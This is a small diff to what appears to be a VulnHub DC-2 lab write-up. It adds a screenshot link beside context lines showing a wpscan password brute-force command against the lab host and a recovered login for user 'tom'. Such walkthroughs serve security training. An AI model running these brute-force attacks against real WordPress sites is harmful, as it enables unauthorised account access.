@@ -276,11 +276,7 @@ root@setrus:~/vulnhub/dc-2# wpscan --url http://dc-2 --passwords docswords.txt -
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Loggin in with user tom :  parturient
-
-
-   
-
-
+![Atl Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC%3A2/dc2.png)
 Bruteforce user jerry
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
